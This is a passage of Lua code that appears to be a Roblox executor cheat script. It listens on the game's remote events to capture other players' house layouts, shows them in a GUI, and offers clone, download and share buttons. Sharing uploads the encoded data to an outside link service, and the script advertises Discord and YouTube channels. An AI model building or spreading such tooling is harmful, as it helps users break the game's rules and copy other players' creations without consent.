	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json",
		["User-Agent"] = "Roblox/WinInet"
	},
	Body = HttpS:JSONEncode({ data = b64 })
})

	if res.StatusCode == 200 then
		local success, responseData = pcall(function()
			return HttpS:JSONDecode(res.Body)
		end)

		if success and typeof(responseData) == "table" then
			if responseData.success and responseData.url then
				showShareModal("Link generado exitosamente", {responseData.url})
			elseif responseData.urls then
				showShareModal("Ya has alcanzado el límite de links. Aquí están tus links existentes:", responseData.urls)
			else
				showShareModal("Error desconocido: " .. (responseData.message or "Sin mensaje"))
			end
		else
			showShareModal("U limit link (3 link actives) use 1 to be able to create new :\n\n" .. tostring(res.Body))
		end
	else
		showShareModal("Error en la solicitud:\n\n" .. tostring(res.Body))
	end

	task.delay(1.5, function()
		shareBtn.Text = "Share"
		shareBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 220)
		shareBtn.AutoButtonColor = true
		isSharing = false
	end)
end)

	local cloneBtn = cB({Name = "CB", Size = UDim2.new(0, 90, 0, 25), Position = UDim2.new(1, -105, 0, 90), BackgroundColor3 = Color3.fromRGB(60, 170, 100), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 12, Text = "CLONE"}, card)
	local dlBtn = cB({Name = "DB", Size = UDim2.new(0, 90, 0, 25), Position = UDim2.new(1, -105, 0, 115), BackgroundColor3 = Color3.fromRGB(60, 120, 190), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 12, Text = "DOWNLOAD"}, card)
	
	cloneBtn.MouseButton1Click:Connect(function()
		cloneBtn.BackgroundColor3 = Color3.fromRGB(40, 130, 70)
		cloneBtn.Text = "CLONING..."
		
		cloneHouse(h)
		
		task.delay(1, function()
			cloneBtn.BackgroundColor3 = Color3.fromRGB(60, 170, 100)
			cloneBtn.Text = "CLONE"
		end)
	end)
	
	dlBtn.MouseButton1Click:Connect(function() showDModal(h) end)
	hScroll.CanvasSize = UDim2.new(0, 0, 0, hList.AbsoluteContentSize.Y)
	return card
end

local function loadHouse(d)
	if type(d) ~= "table" then return false end
	if not d.house_id or not d.building_type or not d.uid or not d.furniture then return false end
	local uid = d.uid
	if houses[uid] then return false end
	
	houses[uid] = d
	createHCard(houses[uid])
	updHCount()
	return true
end

loadBtn.MouseButton1Click:Connect(function()
	local input = loadIn.Text
	if input == "" then return end
	local success = false
	if input:match("^https?://") then
		local hSuccess, result = pcall(function() return game:HttpGet(input) end)
		if hSuccess then
			local jSuccess, jBody = pcall(function() return HttpS:JSONDecode(result) end)
			if jSuccess and typeof(jBody) == "table" and jBody.data then
				local ok, decoded = pcall(function() return HttpS:JSONDecode(customDec(jBody.data)) end)
				if ok then success = loadHouse(decoded) end
			else
				local altOk, altData = pcall(function() return HttpS:JSONDecode(result) end)
				if altOk then success = loadHouse(altData) end
			end
		end
	else
		if readfile then
			local fSuccess, fContent = pcall(function() return readfile(input .. (input:match("%.json$") and "" or ".json")) end)
			if fSuccess then
				local jSuccess, jData = pcall(function() return deobfuscateAuto(fContent) end)
				if jSuccess and jData then success = loadHouse(jData) end
			end
		end
	end
	if success then
		loadIn.Text = ""
		loadIn.PlaceholderText = "House loaded successfully!"
		task.delay(2, function() loadIn.PlaceholderText = "Enter file name or URL..." end)
	else
		loadIn.PlaceholderText = "Failed to load house data!"
		task.delay(2, function() loadIn.PlaceholderText = "Enter file name or URL..." end)
	end
end)

local function processHData(rd)
	if not isValid(rd) then return end
	local hInfo = rd[3]
	local uid = hInfo.unique
	if not houses[uid] then
		local oName = "Unknown"
		local p = hInfo.player
		if typeof(p) == "string" and p ~= "" then
			oName = p
		elseif typeof(p) == "Instance" and p:IsA("Player") then
			oName = p.Name
		elseif typeof(rd[1]) == "string" and rd[1] ~= "" then
			oName = rd[1]
		end
		
		houses[uid] = {
			house_id = hInfo.house_id,
			building_type = hInfo.building_type,
			owner = oName,
			uid = uid,
			listed = hInfo.listed_for_trade,
			ambiance = hInfo.ambiance,
			textures = hInfo.textures,
			furniture = hInfo.furniture
		}
		
		createHCard(houses[uid])
		updHCount()
	end
end

for _, r in pairs(API:GetChildren()) do
	if r:IsA("RemoteEvent") then
		r.OnClientEvent:Connect(function(...) processHData({...}) end)
	end
end

cBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

mBtn.MouseButton1Click:Connect(function()
	local isMin = mF.Size.Y.Offset == 50
	local tSize, tPos
	if not isMin then
		tSize = UDim2.new(0, 400, 0, 50)
		tPos = UDim2.new(1, -420, 0, 20)
	else
		tSize = UDim2.new(0, 400, 0, 500)
		tPos = UDim2.new(1, -420, 0.5, 0)
	end
	local sTween = TS:Create(mF, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = tSize, Position = tPos})
	sTween:Play()
end)

sBox.Changed:Connect(function(prop)
	if prop == "Text" then
		local sText = sBox.Text:lower()
		for _, c in pairs(hScroll:GetChildren()) do
			if c:IsA("Frame") and c.Name:find("HC") then
				if sText == "" then
					c.Visible = true
				else
					local hId = c.ID.Text:lower()
					local hO = c.OL.Text:lower()
					local uid = c.UL.Text:lower()
					c.Visible = hId:find(sText) or hO:find(sText) or uid:find(sText)
				end
			end
		end
	end
end)

local function toClip(text, btn)
	local origText = btn.Text
	if setclipboard then
		setclipboard(text)
		btn.Text = "COPIED!"
		task.delay(1.5, function() btn.Text = origText end)
	end
end

discBtn.MouseButton1Click:Connect(function() toClip("https://discord.gg/RCDQjQ9He6", discBtn) end)
ytBtn.MouseButton1Click:Connect(function() toClip("https://youtube.com/@onecreatorx", ytBtn) end)
webBtn.MouseButton1Click:Connect(function() toClip("https://repository.api-x.site", webBtn) end)

hideUBtn.MouseButton1Click:Connect(function() hU = not hU updPrivBtn(hideUBtn, hU) pNameL.Text = hU and "Hidden" or LP.Name end)
hideHBtn.MouseButton1Click:Connect(function() hH = not hH updPrivBtn(hideHBtn, hH) end)

hTab.MouseButton1Click:Connect(function()
	hTab.BackgroundColor3 = Color3.fromRGB(60, 120, 190)
	hTab.TextColor3 = Color3.fromRGB(255, 255, 255)
	iTab.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
	iTab.TextColor3 = Color3.fromRGB(180, 180, 180)
	hContent.Visible = true
	iContent.Visible = false
end)

iTab.MouseButton1Click:Connect(function()
	iTab.BackgroundColor3 = Color3.fromRGB(60, 120, 190)
	iTab.TextColor3 = Color3.fromRGB(255, 255, 255)
	hTab.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
	hTab.TextColor3 = Color3.fromRGB(180, 180, 180)
	hContent.Visible = false
	iContent.Visible = true
end)

local function updCanvas()
	hScroll.CanvasSize = UDim2.new(0, 0, 0, hList.AbsoluteContentSize.Y)
	iScroll.CanvasSize = UDim2.new(0, 0, 0, iLayout.AbsoluteContentSize.Y + 20)
end

updCanvas()

local function resizeUI()
	local vSize = workspace.CurrentCamera.ViewportSize
	local margin = 10
	local availWidth = vSize.X - margin * 2
	local availHeight = vSize.Y - margin * 2

	if vSize.X < 800 then
		mF.Size = UDim2.new(0, math.min(350, availWidth * 0.8), 0, math.min(500, availHeight * 0.8))
		mF.Position = UDim2.new(0, margin, 0.5, 0)
		appT.TextSize = 20
		appV.TextSize = 14
		appC.TextSize = 14
		sBox.TextSize = 14
	else
		mF.Size = UDim2.new(0, math.min(400, availWidth), 0, math.min(500, availHeight))
		mF.Position = UDim2.new(0, margin, 0.5, 0)
		appT.TextSize = 24
		appV.TextSize = 16
		appC.TextSize = 16
		sBox.TextSize = 16
	end

	updCanvas()
end

resizeUI()
workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(resizeUI)

local dragging, dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	mF.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

head.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = mF.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

head.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
